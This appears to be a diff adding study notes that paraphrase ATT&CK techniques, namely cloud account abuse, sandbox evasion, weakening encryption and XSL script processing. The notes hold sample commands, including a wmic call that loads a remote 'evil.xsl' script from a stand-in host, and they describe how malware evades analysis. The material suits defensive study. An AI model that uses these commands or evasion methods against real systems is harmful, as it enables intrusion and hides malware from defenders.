+* Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a Trusted Relationship
+* Compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment
+
+Once a cloud account is compromised, an adversary may perform Account Manipulation - for example, by adding Additional Cloud Roles - to maintain persistence and potentially escalate their privileges
 <hr>
 
 
 # Virtualization/Sandbox Evasion
+Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox
+* If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant
+* They may also search for VME artifacts before dropping secondary or additional payloads
+* Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors 
 
+Adversaries may use several methods to accomplish *Virtualization/Sandbox Evasion* such as checking for security monitoring tools or other system artifacts associated with analysis or virtualization
+* Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment
+* Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox 
 <br>
+
+### System Checks
+Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a VME/sandbox
+* If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant
+* They may also search for VME artifacts before dropping secondary or additional payloads
+* Adversaries may use the information learned from *Virtualization/Sandbox Evasion* during automated discovery to shape follow-on behaviors
+
+Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts
+* Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry
+* Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a VME
+
+Checks could include generic system properties such as host/domain name and samples of network traffic
+* Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size
+
+Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to VM applications, and VME-specific hardware/processor instructions
+* In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output
+
+Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a VME
+* Adversaries may also query for specific readings from these devices
+<br>
+
+### User Activity Based Checks
+Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a VME/sandbox
+* If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant
+* They may also search for VME artifacts before dropping secondary or additional payloads
+* Adversaries may use the information learned from *Virtualization/Sandbox Evasion* during automated discovery to shape follow-on behaviors
+
+Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks, browser history, cache, bookmarks, or number of files in common directories such as home or the desktop
+* Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro or waiting for a user to double click on an embedded image to activate
+<br>
+
+### Time Based Evasion
+Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a  VME/sandbox, specifically those that are automated or only operate for a limited amount of time
+
+Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job)
+* Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny
+
+Benign commands or other operations may also be used to delay malware execution
+* Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments
+* **API Hammering:** Involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data)
+
+Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time
+* Attackers may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function
+
 <hr>
 
-
 # Weaken Encryption
+Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications 
 
+Encryption can be used to protect transmitted network traffic to maintain its confidentiality and integrity
+* Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key
+  * Typically, longer keys increase the cost of cryptanalysis, or decryption without the key
+
+Adversaries can compromise and manipulate devices that perform encryption of network traffic
+* Through behaviors such as *Modify System Image, Reduce Key Space, and Disable Crypto Hardware*, an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic
+  * This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts 
 <br>
+
+### Reduce Key Space
+Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes)
+* As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key
+
+Adversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device 
+<br>
+
+### Disable Crypto Hardware
+Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data
+
+Many network devices perform encryption on network traffic to secure transmission across networks
+* Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering
+* When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of *Modify System Image*, forcing the use of software to perform encryption on general processors
+  * This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space)
 <hr>
 
 
 # XSL Script Processing
+Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files
+* XSL files are commonly used to describe the processing and rendering of data within XML files
+  * To support complex operations, the XSL standard includes support for embedded scripting in various languages 
 
-qwertyu
+Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control
+* Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files
+* Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files
+* **Msxsl.exe** takes two main arguments, an XML source file and an XSL stylesheet
+* Since the XSL file is valid XML, the adversary may call the same XSL file twice
+* When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension
+
+**Command-line examples:**
+
+* `msxsl.exe customers.xml script.xsl`
+* `msxsl.exe script.xsl script.xsl`
+* `msxsl.exe script.jpeg script.jpeg`
 
 
+Another variation of this technique, dubbed "**Squiblytwo**", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file
+* This technique can also execute local/remote scripts and, similar to its *Regsvr32/* "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool
+* Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the `/FORMAT` switch
 
+**Command-line examples:**
 
-
-
-qwertyui
-
-
-
-
-
-qwertyuio
+* Local File: `wmic process list /FORMAT:evil.xsl`
+Remote File: `wmic os get /FORMAT:"https://example.com/evil.xsl"`
